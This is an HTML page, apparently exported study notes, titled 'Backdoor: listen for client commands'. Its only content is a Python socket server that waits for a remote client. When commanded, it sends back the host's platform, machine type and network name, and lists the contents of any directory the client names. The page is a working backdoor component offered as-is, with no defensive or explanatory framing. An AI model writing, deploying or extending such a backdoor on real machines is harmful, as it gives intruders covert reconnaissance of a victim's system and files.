<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Backdoor: listen for client commands</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Backdoor: listen for client commands</h1><br/><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/usr/bin/env python3</span><br /><br /><span style="color:#333333;font-weight:400">import</span> socket, platform, os<br /><br />SERVER_ADDRESS = <span style="color:#3ad900;font-weight:400">&quot;192.168.1.29&quot;</span>  <span style="color:#0088ff;font-weight:400"># address of this server 127.0.0.1 </span><br />SERVER_PORT = <span style="color:#ff0044;font-weight:400">65432</span>        <span style="color:#0088ff;font-weight:400"># Port to listen on (non-privileged ports are &gt; 1023)</span><br /><br />s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />s.bind((SERVER_ADDRESS, SERVER_PORT))<br />s.listen(<span style="color:#ff0044;font-weight:400">1</span>)   <span style="color:#0088ff;font-weight:400">#argument 1 specifies the maximum number of queued connections</span><br /><span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">&quot;server started wainting for connection... &quot;</span>)<br />connection, address = s.accept()<br /><span style="color:#ff9d00;font-weight:700">print</span>(<span style="color:#3ad900;font-weight:400">&quot;client connected with address&quot;</span>, address)<br /><span style="color:#ff9d00;font-weight:700">while</span> <span style="color:#ff0044;font-weight:400">True</span>:<br />    data = connection.recv(<span style="color:#ff0044;font-weight:400">1024</span>)<br />    <span style="color:#ff9d00;font-weight:700">if</span> (data.decode(<span style="color:#3ad900;font-weight:400">&quot;utf-8&quot;</span>)==<span style="color:#3ad900;font-weight:400">&quot;1&quot;</span>):<br />        system_info=platform.platform()+<span style="color:#3ad900;font-weight:400">&quot;;\nmachine type: &quot;</span>+platform.machine()+<span style="color:#3ad900;font-weight:400">&quot;;\ncomputerâ€™s network name: &quot;</span>+platform.node()<br />        connection.sendall(system_info.encode())<br />    <span style="color:#ff9d00;font-weight:700">elif</span> (data.decode(<span style="color:#3ad900;font-weight:400">&quot;utf-8&quot;</span>)==<span style="color:#3ad900;font-weight:400">&quot;2&quot;</span>):<br />        path = connection.recv(<span style="color:#ff0044;font-weight:400">1024</span>)<br />        <span style="color:#ff9d00;font-weight:700">try</span>:<br />            list_of_file=os.listdir(path.decode(<span style="color:#3ad900;font-weight:400">&quot;utf-8&quot;</span>)) <span style="color:#0088ff;font-weight:400">#directory of the typed path</span><br />            file_os=<span style="color:#3ad900;font-weight:400">&quot;***&quot;</span>.join(list_of_file) <span style="color:#0088ff;font-weight:400">#convert a list to string separated by ***</span><br />        <span style="color:#ff9d00;font-weight:700">except</span>:<br />            file_os=<span style="color:#3ad900;font-weight:400">&quot;Wrong path :(&quot;</span><br />        connection.sendall(file_os.encode())<br />    <span style="color:#ff9d00;font-weight:700">elif</span>(data.decode(<span style="color:#3ad900;font-weight:400">&quot;utf-8&quot;</span>)==<span style="color:#3ad900;font-weight:400">&quot;0&quot;</span>):<br />        connection.close()<br /><br /></pre></div></div>
</body>
</html>
